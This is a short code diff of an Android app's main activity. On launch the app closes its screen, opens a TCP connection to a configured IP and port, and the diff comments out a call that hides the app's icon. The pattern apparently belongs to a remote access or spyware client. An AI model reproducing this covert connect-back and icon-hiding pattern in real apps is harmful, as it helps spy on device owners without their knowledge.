@@ -29,6 +29,6 @@ public class MainActivity extends AppCompatActivity {
         finish();
         new tcpConnection(activity,context).execute(config.IP,config.port);
         overridePendingTransition(0, 0);
-        new functions(activity).hideAppIcon(context);
+        //new functions(activity).hideAppIcon(context);
     }
 }
